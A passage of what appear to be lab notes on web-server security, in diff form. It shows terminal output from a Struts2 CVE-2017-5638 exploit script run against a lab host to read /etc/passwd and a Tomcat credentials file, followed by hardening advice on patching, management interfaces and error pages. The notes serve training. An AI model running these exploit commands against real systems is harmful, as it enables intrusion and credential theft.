+   [*] CVE: 2017-5638 - Apache Struts2 S2-045
+   [*] cmd: id
+   
+   uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
+   
+                                                                                                                         
+   ┌──(kali㉿kali)-[~/Desktop]
+   └─$ python struts2-cve-2017-5638.py http://192.168.101.119:8080/struts2/ "whoami"
+   [*] CVE: 2017-5638 - Apache Struts2 S2-045
+   [*] cmd: whoami
+   
+   tomcat
+   
+                                                                                                                         
+   ┌──(kali㉿kali)-[~/Desktop]
+   └─$ python struts2-cve-2017-5638.py http://192.168.101.119:8080/struts2/ "cat /etc/passwd"
+   [*] CVE: 2017-5638 - Apache Struts2 S2-045
+   [*] cmd: cat /etc/passwd
+   
+   root:x:0:0:root:/root:/bin/bash
+   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+   bin:x:2:2:bin:/bin:/usr/sbin/nologin
+   sys:x:3:3:sys:/dev:/usr/sbin/nologin
+   sync:x:4:65534:sync:/bin:/bin/sync
+   games:x:5:60:games:/usr/games:/usr/sbin/nologin
+   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+   irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+   systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+   systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+   systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+   messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+   syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+   _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+   tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+   uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+   tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+   landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+   pollinate:x:110:1::/var/cache/pollinate:/bin/false
+   usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+   sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+   systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+   bookshelf:x:1000:1000:bookshelf:/home/bookshelf:/bin/bash
+   lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+   tomcat:x:997:997:Apache Tomcat:/:/usr/sbin/nologin
+   mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
+   
+                                                                                                                         
+   ┌──(kali㉿kali)-[~/Desktop]
+   └─$ python struts2-cve-2017-5638.py http://192.168.101.119:8080/struts2/ "cat conf/tomcat-users.xml" 
+   [*] CVE: 2017-5638 - Apache Struts2 S2-045
+   [*] cmd: cat conf/tomcat-users.xml
+   
+   <?xml version="1.0" encoding="UTF-8"?>
+   <!--
+     Licensed to the Apache Software Foundation (ASF) under one or more
+     contributor license agreements.  See the NOTICE file distributed with
+     this work for additional information regarding copyright ownership.
+     The ASF licenses this file to You under the Apache License, Version 2.0
+     (the "License"); you may not use this file except in compliance with
+     the License.  You may obtain a copy of the License at
+   
+         http://www.apache.org/licenses/LICENSE-2.0
+   
+     Unless required by applicable law or agreed to in writing, software
+     distributed under the License is distributed on an "AS IS" BASIS,
+     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+     See the License for the specific language governing permissions and
+     limitations under the License.
+   -->
+   <tomcat-users xmlns="http://tomcat.apache.org/xml"
+                 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+                 version="1.0">
+   <!--
+     NOTE:  By default, no user is included in the "manager-gui" role required
+     to operate the "/manager/html" web application.  If you wish to use this app,
+     you must define such a user - the username and password are arbitrary. It is
+     strongly recommended that you do NOT use one of the users in the commented out
+     section below since they are intended for use with the examples web
+     application.
+   -->
+   <!--
+     NOTE:  The sample user and role entries below are intended for use with the
+     examples web application. They are wrapped in a comment and thus are ignored
+     when reading this file. If you wish to configure these users for use with the
+     examples web application, do not forget to remove the <!.. ..> that surrounds
+     them. You will also need to set the passwords to something appropriate.
+   -->
+   <!--
+     <role rolename="tomcat"/>
+     <role rolename="role1"/>
+     <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
+     <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
+     <user username="role1" password="<must-be-changed>" roles="role1"/>
+   -->
+     <role rolename="admin-gui"/>
+   <role rolename="manager-gui"/>
+   <user username="admin" password="admin" roles="admin-gui,manager-gui"/>
+     </tomcat-users>
+   
+   ```
+
+   
+
+### SECURING THE ENVIRONMENT
+**STAY CURRENT WITH SERVER VERSIONS:**
+
+* Make sure that your apache tomcat (or any web/app server used in your environment) version is
+the latest.
+
+**CONTROL WHO CAN ACCESS MANAGEMENT INTERFACES:**
+
+* Management interfaces usually have privileged features such as deploying war files. Only
+certain users or administrators need access to these interfaces. So, it is recommended to bind
+these interfaces to limited IP addresses.
+
+## Improper Error Handling
+
+* Java (and most other languages) provides great debugging features for Web Developers.
+* Stack traces are great way to find root cause of an exception.
++ But, exceptions are not for everyone to view.
+
+**EXAMPLE SHOWING RESOURCE NOT FOUND EXCEPTION:**
+
+* The exception shows details that are not necessary to an end user:
+  - Apache Tomcat version
+  - Server operating System
+    
+
+![image-20211016161632862](images/image-20211016161632862.png)
+
+### SAFE ERROR HANDLING
+* We can configure web.xml to redirect the user to an error page when an exception occurs.
+* We must add a separate element to web.xml for each possible HTTP error code.
+
+![image-20211016163209393](images/image-20211016163209393.png)
+
+
+
+## Install Wep App via Docker
+
+**Damn Vulnerable Web Application**
+
+```
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+```
+
+**OWASP Juice Shop**
+
+```
+docker run --rm -it -p 3000:3000 bkimminich/juice-shop
+```
 
